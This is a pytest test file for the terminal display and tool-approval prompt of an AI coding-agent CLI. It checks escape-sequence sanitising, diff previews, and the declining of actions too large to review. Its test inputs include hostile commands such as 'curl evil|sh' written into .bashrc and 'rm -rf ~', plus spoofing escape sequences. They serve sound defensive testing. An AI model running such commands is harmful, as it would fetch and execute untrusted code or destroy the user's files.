"""Rendering, the approval prompt, and the completer. No real terminal needed."""

import io
import os
import re

import pytest
from rich.console import Console

from agentx_dev.cli.approval import Request
from agentx_dev.cli.preview import MAX_COMMAND_CHARS
from agentx_dev.cli.ui import PromptInput, Screen, bullet, make_asker, make_completer, plain, safe_toolbar


def console(**kw):
    out = io.StringIO()
    return Console(file=out, width=100, force_terminal=False, color_system=None, **kw), out


def styled_console():
    """A console that would emit real ANSI codes if anything asked it to."""
    out = io.StringIO()
    return Console(file=out, width=100, force_terminal=True, color_system="standard"), out


class TestScreen:
    def test_a_tool_call_is_one_line_with_a_summary(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_call", "name": "edit_file", "args": {"path": "src/app.py"}})
        assert out.getvalue().strip().endswith("edit_file  src/app.py") and "●" in out.getvalue()

    def test_a_result_is_collapsed_after_three_lines(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_result", "name": "read_path", "is_error": False,
                              "result": "\n".join(f"line{i}" for i in range(10))})
        text = out.getvalue()
        assert "line0" in text and "line2" in text and "line3" not in text and "... 7 more lines" in text

    def test_square_brackets_in_output_are_not_markup(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_result", "name": "run_shell", "is_error": False,
                              "result": "[bold]not markup[/bold] and [red]x"})
        assert "[bold]not markup[/bold]" in out.getvalue()

    def test_thoughts_finals_notices_and_errors(self):
        c, out = console()
        s = Screen(c)
        s.show_event({"type": "thought", "content": "thinking about it"})
        s.show_event({"type": "final", "content": "**Done** with the task"})
        s.show_event({"type": "text_delta", "content": "ignored"})
        s.show_event({"type": "completion", "completion": object()})
        s.notice("hello")
        s.error("boom")
        text = out.getvalue()
        assert "thinking about it" in text and "Done with the task" in text
        assert "ignored" not in text and "hello" in text and "boom" in text

    def test_a_console_that_cannot_print_the_bullet_gets_a_star(self):
        legacy = Console(file=io.TextIOWrapper(io.BytesIO(), encoding="cp1252"), force_terminal=False)
        assert bullet(legacy) == "*"
        c, _ = console()
        assert bullet(c) == "●"

    def test_a_tool_call_with_non_dict_args_does_not_crash(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_call", "name": "mystery", "args": "plain text"})
        assert "mystery" in out.getvalue()


class TestNothingModelSuppliedCanStyleOrSpoofTheScreen:
    ESC = "\x1b[2J\x1b[31mFAKE\x1b[0m"

    def test_plain_defuses_escapes_and_direction_overrides(self):
        text = plain("a\x1b[31mb\x07\rc‮d\x9b")
        assert "\x1b" not in text and "\x07" not in text and "\r" not in text
        assert "‮" not in text and "\x9b" not in text
        assert plain("tab\tand\nnewline", keep_newlines=True) == "tab\tand\nnewline"
        assert plain("héllo ✓ 日本 👨‍👩") == "héllo ✓ 日本 👨‍👩"

    def test_plain_escapes_invisible_fillers_and_tag_characters(self):
        hidden = "ㅤ\U000e0041⁯͏ᅟᅠ￹⁤"
        text = plain("a" + hidden + "b")
        for char in hidden:
            assert char not in text
        assert "\\u3164" in text and "\\U000e0041" in text and text.startswith("a") and text.endswith("b")

    def test_blank_looking_characters_are_escaped(self):
        text = plain("a\u2800\xa0\u3000b\u2003\u202f\u205f\u1680 c")
        for escaped in ("\\u2800", "\\xa0", "\\u3000", "\\u2003", "\\u202f", "\\u205f", "\\u1680"):
            assert escaped in text
        assert text.startswith("a") and text.endswith("b\\u2003\\u202f\\u205f\\u1680 c")
        assert plain("plain words stay") == "plain words stay"

    def test_odd_line_breaks_are_escaped_not_split(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_result", "name": "x", "is_error": False,
                              "result": "a\x0bb\x0cc\x1cd\x85e\rf"})
        text = out.getvalue()
        assert len(text.splitlines()) == 1 and "more lines" not in text
        assert "\\x0b" in text and "\\x85" in text and "\\x0d" in text

    def test_crlf_is_one_break(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_result", "name": "x", "is_error": False, "result": "a\r\nb\r\n"})
        assert [l.strip() for l in out.getvalue().splitlines()] == ["a", "b"]

    def test_an_odd_event_or_result_cannot_raise(self):
        class Bad:
            def __str__(self):
                raise RuntimeError("no")
        c, out = console()
        s = Screen(c)
        s.show_event(None)
        s.show_event({"type": "tool_result", "name": "x", "is_error": False, "result": Bad()})
        s.show_event({"type": "tool_call", "name": Bad(), "args": {"path": Bad()}})
        s.show_event({"type": "final", "content": None})

    def test_results_thoughts_calls_notices_and_errors_carry_no_escape_sequences(self):
        c, out = styled_console()
        s = Screen(c)
        s.show_event({"type": "tool_result", "name": "x", "is_error": False, "result": self.ESC})
        s.show_event({"type": "thought", "content": self.ESC})
        s.show_event({"type": "tool_call", "name": "x\x1b[31m", "args": {"path": self.ESC}})
        s.notice(self.ESC)
        s.error(self.ESC)
        text = out.getvalue()
        assert "\x1b[2J" not in text            # the model's own clear-screen never reaches the terminal
        assert "\x1b[31mFAKE" not in text       # nor its red "FAKE" (rich's own styling is never followed by FAKE)

    def test_a_final_answer_is_markdown_but_cannot_inject_escapes_or_links(self):
        c, out = styled_console()
        Screen(c).show_event({"type": "final", "content": f"**bold** {self.ESC} [click](http://evil.example)"})
        text = out.getvalue()
        assert "\x1b[2J" not in text and "\x1b]8;" not in text   # no OSC 8 hyperlink either
        assert "FAKE" in text and "bold" in text

    def test_a_tool_call_name_cannot_break_the_line(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_call", "name": "evil\nFAKE LINE", "args": {}})
        assert len(out.getvalue().strip().splitlines()) == 1


def lines(*items):
    queue = list(items)

    def read(prompt=""):
        read.prompts.append(prompt)
        if not queue:
            raise EOFError
        item = queue.pop(0)
        if isinstance(item, BaseException):
            raise item
        return item
    read.prompts = []
    return read


def edit_request():
    return Request(tool="write_file", kind="edit", subject="a.txt",
                   args={"path": "a.txt", "content": "hi\n", "if_exists": "refuse"},
                   remember=True, grant="all edits this session")


class TestApprovalPrompt:
    def test_yes_shows_the_diff_and_returns_y(self, tmp_path):
        c, out = console()
        answer = make_asker(c, lines("y"), tmp_path)(edit_request())
        assert answer.choice == "y"
        text = out.getvalue()
        assert "Create a.txt" in text and "+hi" in text and "[a] yes, don't ask again" in text

    def test_the_prompt_says_exactly_what_always_will_remember(self, tmp_path):
        c, out = console()
        make_asker(c, lines("y"), tmp_path)(edit_request())
        assert "all edits this session" in out.getvalue()

    def test_a_returns_a(self, tmp_path):
        c, _ = console()
        assert make_asker(c, lines("a"), tmp_path)(edit_request()).choice == "a"

    def test_no_asks_for_a_reason(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines("n", "wrong file"), tmp_path)(edit_request())
        assert (answer.choice, answer.reason) == ("n", "wrong file")

    def test_garbage_is_asked_again(self, tmp_path):
        c, out = console()
        answer = make_asker(c, lines("maybe", "perhaps", "yes"), tmp_path)(edit_request())
        assert answer.choice == "y" and out.getvalue().count("Please answer") == 2

    def test_bare_enter_is_a_no(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines("", ""), tmp_path)(edit_request())
        assert answer.choice == "n"

    def test_ctrl_d_declines(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines(), tmp_path)(edit_request())
        assert answer.choice == "n" and answer.reason

    def test_ctrl_c_declines_and_does_not_run_the_tool(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines(KeyboardInterrupt()), tmp_path)(edit_request())
        assert answer.choice == "n" and answer.reason

    def test_ctrl_c_at_the_reason_prompt_is_still_a_no(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines("n", KeyboardInterrupt()), tmp_path)(edit_request())
        assert (answer.choice, answer.reason) == ("n", "")

    def test_actions_the_gate_cannot_remember_do_not_offer_always(self, tmp_path):
        c, out = console()
        request = Request(tool="delete_path", kind="destructive", subject="x", args={"path": "x"},
                          remember=False)
        answer = make_asker(c, lines("a", "always", "y"), tmp_path)(request)
        assert answer.choice == "y"
        text = out.getvalue()
        assert "[a]" not in text and "don't ask again" not in text and "Please answer y or n." in text

    def test_a_command_is_shown_as_typed(self, tmp_path):
        c, out = console()
        request = Request(tool="run_shell", kind="command", subject="pytest -q", args={"command": "pytest -q [x]"},
                          remember=True, grant="pytest")
        make_asker(c, lines("n", ""), tmp_path)(request)
        text = out.getvalue()
        assert "Run shell command" in text and "pytest -q [x]" in text and "pytest" in text

    def test_markup_and_escapes_in_the_preview_and_title_are_inert(self, tmp_path):
        c, out = styled_console()
        request = Request(tool="run_shell", kind="command", subject="x",
                          args={"command": "echo [bold red]ok[/] \x1b[2J ‮", "cwd": "[green]dir\x1b[0m"},
                          remember=True, grant="echo [red]x[/red]")
        make_asker(c, lines("n", ""), tmp_path)(request)
        text = out.getvalue()
        assert "\x1b[2J" not in text and "‮" not in text
        assert "[bold red]ok[/]" in text and "[green]dir" in text and "[red]x[/red]" in text

    def test_a_file_name_cannot_forge_an_options_line(self, tmp_path):
        c, out = console()
        request = Request(tool="delete_path", kind="destructive", subject="x",
                          args={"path": "x\n[a] yes, don't ask again"}, remember=False)
        make_asker(c, lines("y"), tmp_path)(request)
        shown = [line.strip("│ ").strip() for line in out.getvalue().splitlines()]
        assert not any(line.startswith("[a]") for line in shown)
        assert any("Action: Delete x\\n[a] yes" in line for line in shown)   # the break is shown, not made


def squash(text):
    """Output with panel borders and all whitespace removed, so wrapped text can be searched."""
    return re.sub(r"[\s│╭╮╰╯─|+\-]", "", text)


def squash_spaces(text):
    return " ".join(text.split())


def legacy_console(encoding="cp1252", width=100):
    raw = io.BytesIO()
    file = io.TextIOWrapper(raw, encoding=encoding, newline="")
    return Console(file=file, width=width, force_terminal=False, color_system=None), file, raw


class TestLegacyConsoles:
    def test_screen_does_not_die_on_text_the_console_cannot_encode(self):
        c, file, raw = legacy_console()
        s = Screen(c)
        s.show_event({"type": "tool_result", "name": "x", "is_error": False, "result": "日本語"})
        s.show_event({"type": "final", "content": "done ✓ 日本"})
        s.show_event({"type": "thought", "content": "考える"})
        s.notice("日本")
        s.error("日本")
        file.flush()
        text = raw.getvalue().decode("cp1252")
        assert "\\u65e5" in text and "done" in text and "\\u2713" in text

    def test_the_asker_does_not_die_on_it_either(self, tmp_path):
        c, file, raw = legacy_console("ascii")
        request = Request(tool="run_shell", kind="command", subject="echo 日本",
                          args={"command": "echo 日本"}, remember=True, grant="echo")
        assert make_asker(c, lines("y"), tmp_path)(request).choice == "y"
        file.flush()
        assert "\\u65e5" in raw.getvalue().decode("ascii")


class TestWhatTheGateJudgesIsWhatTheUserSees:
    def test_a_long_destructive_path_keeps_its_qualifier(self, tmp_path):
        c, out = console()
        path = "a/" * 40
        request = Request(tool="delete_path", kind="destructive", subject=path.rstrip("/"),
                          args={"path": path, "recursive": True}, remember=False)
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "everythinginsideit" in squash(out.getvalue())

    def test_a_move_shows_both_ends(self, tmp_path):
        c, out = console()
        dest = "d/" * 30 + "final-name.txt"
        request = Request(tool="move_file", kind="destructive", subject=f"src.txt -> {dest}",
                          args={"source": "src.txt", "destination": dest}, remember=False)
        make_asker(c, lines("n", ""), tmp_path)(request)
        text = squash(out.getvalue())
        assert squash("final-name.txt") in text and "src.txt" in text

    def test_write_qualifiers_are_not_lost(self, tmp_path):
        (tmp_path / "a.txt").write_text("old", encoding="utf-8")
        c, out = console()
        request = Request(tool="write_file", kind="edit", subject="a.txt",
                          args={"path": "a.txt", "content": "new", "if_exists": "rename"},
                          remember=True, grant="all edits this session")
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "savedunderanewname" in squash(out.getvalue())

    def test_the_subject_the_gate_judges_is_printed(self, tmp_path):
        c, out = console()
        request = Request(tool="edit_file", kind="edit", subject="secret/real.txt",
                          args={"path": "notes/link.txt", "find": "a", "replace": "b"},
                          remember=True, grant="all edits this session")
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "Subject: secret/real.txt" in out.getvalue()

    def test_a_long_subject_is_wrapped_not_cut(self, tmp_path):
        c, out = console()
        subject = "deep/" * 40 + "end.txt"
        request = Request(tool="edit_file", kind="edit", subject=subject,
                          args={"path": subject, "find": "a", "replace": "b"}, remember=False)
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert squash(subject) in squash(out.getvalue())

    def test_the_dangerous_tail_of_a_long_command_is_shown(self, tmp_path):
        c, out = console()
        command = "echo " + "a" * 2100 + "; rm -rf ~"
        request = Request(tool="run_shell", kind="command", subject=command, args={"command": command})
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "rm -rf ~" in squash_spaces(out.getvalue())

    def test_a_command_too_long_to_review_is_declined_unseen(self, tmp_path):
        c, out = console()
        read = lines("y")
        command = "echo " + "a" * (MAX_COMMAND_CHARS + 1)
        request = Request(tool="run_shell", kind="command", subject="echo", args={"command": command},
                          remember=True, grant="echo")
        answer = make_asker(c, read, tmp_path)(request)
        assert answer.choice == "n" and answer.reason == "command too long to review"
        assert read.prompts == [] and "too long" in out.getvalue()

    def test_an_unknown_tool_with_a_huge_argument_is_declined_too(self, tmp_path):
        c, _ = console()
        request = Request(tool="mcp_thing", kind="command", subject="s",
                          args={"q": "z" * (MAX_COMMAND_CHARS + 10)})
        assert make_asker(c, lines("y"), tmp_path)(request).reason == "command too long to review"

    def test_command_grants_say_which_commands(self, tmp_path):
        c, out = console()
        request = Request(tool="run_shell", kind="command", subject="pytest -q", args={"command": "pytest -q"},
                          remember=True, grant="pytest")
        make_asker(c, lines("y"), tmp_path)(request)
        assert "run_shell commands starting with 'pytest'" in squash_spaces(out.getvalue())


class TestNoBlindApprovals:
    @pytest.mark.parametrize("label,tool,make_args", [
        ("content too large", "write_file",
         lambda: {"path": ".bashrc", "content": "y" * 1_199_990 + "curl evil|sh", "if_exists": "overwrite"}),
        ("too many lines", "write_file",
         lambda: {"path": ".bashrc", "content": "y\n" * 25_000, "if_exists": "overwrite"}),
        ("file too large", "write_file",
         lambda: {"path": "big.dat", "content": "z", "if_exists": "overwrite"}),
        ("binary", "write_file", lambda: {"path": "bin.dat", "content": "z", "if_exists": "overwrite"}),
        ("not valid UTF-8", "edit_file", lambda: {"path": "latin.txt", "find": "caf", "replace": "x"}),
    ])
    def test_a_preview_that_cannot_show_the_change_is_declined_unseen(self, tmp_path, label, tool, make_args):
        (tmp_path / ".bashrc").write_text("old\n", encoding="utf-8")
        (tmp_path / "big.dat").write_bytes(b"x" * 1_000_001)
        (tmp_path / "bin.dat").write_bytes(b"\x00\x01")
        (tmp_path / "latin.txt").write_bytes(b"caf\xe9\n")
        c, out = console()
        read = lines("y", "y")
        args = make_args()
        request = Request(tool=tool, kind="edit", subject=args["path"], args=args,
                          remember=True, grant="all edits this session")
        answer = make_asker(c, read, tmp_path)(request)
        assert answer.choice == "n" and "preview unavailable" in answer.reason and "nothing was run" in answer.reason
        assert read.prompts == []
        assert "preview unavailable" in out.getvalue()

    def test_the_reason_names_what_was_too_large(self, tmp_path):
        c, _ = console()
        args = {"path": "n.txt", "content": "y" * 1_200_000, "if_exists": "refuse"}
        request = Request(tool="write_file", kind="edit", subject="n.txt", args=args)
        answer = make_asker(c, lines("y"), tmp_path)(request)
        assert answer.reason == "preview unavailable (content too large); nothing was run"

    def test_the_counted_line_cut_can_still_be_approved(self, tmp_path):
        c, out = console()
        content = "".join(f"line {i}\n" for i in range(300))
        args = {"path": "n.txt", "content": content, "if_exists": "refuse"}
        request = Request(tool="write_file", kind="edit", subject="n.txt", args=args)
        assert make_asker(c, lines("y"), tmp_path)(request).choice == "y"
        assert "more lines" in out.getvalue()


class TestSubjectLine:
    def test_a_plain_command_is_shown_once(self, tmp_path):
        c, out = console()
        request = Request(tool="run_shell", kind="command", subject="rm -rf ~", args={"command": "rm -rf ~"})
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert out.getvalue().count("rm -rf ~") == 1 and "Subject:" not in out.getvalue()

    def test_a_subject_equal_to_the_action_is_not_repeated(self, tmp_path):
        c, out = console()
        request = Request(tool="mystery", kind="command", subject="mystery", args={"q": 1})
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "Subject:" not in out.getvalue()

    def test_a_different_subject_is_still_printed(self, tmp_path):
        c, out = console()
        request = Request(tool="edit_file", kind="edit", subject="secret/real.txt",
                          args={"path": "notes/link.txt", "find": "a", "replace": "b"})
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "Subject: secret/real.txt" in out.getvalue()


class TestInputFailures:
    @pytest.mark.parametrize("error", [OSError("no console"), UnicodeDecodeError("utf-8", b"\xff", 0, 1, "bad"),
                                       RuntimeError("x")])
    def test_any_read_error_is_a_no(self, tmp_path, error):
        c, _ = console()
        answer = make_asker(c, lines(error), tmp_path)(edit_request())
        assert (answer.choice, answer.reason) == ("n", "could not read an answer")

    def test_a_read_error_at_the_reason_prompt_is_just_no_reason(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines("n", OSError("x")), tmp_path)(edit_request())
        assert (answer.choice, answer.reason) == ("n", "")

    def test_the_default_reader_is_plain_input(self, tmp_path, monkeypatch):
        monkeypatch.setattr("builtins.input", lambda prompt="": "y")
        c, _ = console()
        assert make_asker(c, None, tmp_path)(edit_request()).choice == "y"


class TestPromptInputWithoutAConsole:
    def test_falls_back_to_input_and_keeps_a_private_history_file(self, tmp_path, monkeypatch):
        monkeypatch.setattr("agentx_dev.cli.ui._has_console", lambda: False)
        monkeypatch.setattr("builtins.input", lambda prompt="": "hello")
        history = tmp_path / "sub" / "history"
        prompt = PromptInput(history_file=history, commands=["/help"], toolbar=lambda: "x",
                             cycle_mode=lambda: None)
        assert prompt.read("> ") == "hello" and prompt.read_short("? ") == "hello"
        assert history.exists()
        if os.name != "nt":
            assert (history.stat().st_mode & 0o777) == 0o600

    def test_a_prompt_toolkit_that_cannot_start_falls_back(self, tmp_path, monkeypatch):
        import prompt_toolkit

        def broken(*args, **kwargs):
            raise OSError("NoConsoleScreenBufferError")
        monkeypatch.setattr("agentx_dev.cli.ui._has_console", lambda: True)
        monkeypatch.setattr(prompt_toolkit, "PromptSession", broken)
        monkeypatch.setattr("builtins.input", lambda prompt="": "typed")
        prompt = PromptInput(history_file=tmp_path / "h", commands=[], toolbar=lambda: "x",
                             cycle_mode=lambda: None)
        assert prompt.read() == "typed"

    def test_the_toolbar_text_is_neutralised(self):
        assert safe_toolbar(lambda: "mode \x1b[31mred")() == "mode \\x1b[31mred"
        assert safe_toolbar(lambda: 1 / 0)() == ""


class TestCompleter:
    def complete(self, completer, text):
        from prompt_toolkit.completion import CompleteEvent
        from prompt_toolkit.document import Document
        return [c.text for c in completer.get_completions(Document(text), CompleteEvent())]

    def test_slash_commands_complete(self):
        completer = make_completer(["/help", "/model", "/mode"])
        assert self.complete(completer, "/mo") == ["/model", "/mode"]
        assert self.complete(completer, "/") == ["/help", "/model", "/mode"]
        assert self.complete(completer, "/zzz") == []

    def test_paths_complete_after_a_word(self, tmp_path):
        (tmp_path / "notes.txt").write_text("x", encoding="utf-8")
        completer = make_completer(["/help"])
        found = self.complete(completer, f"open {tmp_path.as_posix()}/no")
        assert "tes.txt" in found      # the rest of "notes.txt" after the typed "no"
